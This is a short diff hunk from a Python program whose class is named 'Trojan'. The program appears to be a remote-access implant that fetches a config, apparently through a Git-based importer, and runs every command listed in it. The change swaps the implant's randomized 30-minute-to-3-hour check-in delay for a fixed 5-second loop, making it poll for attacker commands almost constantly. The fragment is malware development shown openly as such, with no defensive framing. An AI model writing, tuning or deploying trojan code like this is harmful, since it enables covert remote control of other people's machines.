@@ -149,7 +149,7 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(5)
 
 class GitImporter:
     def __init__(self):
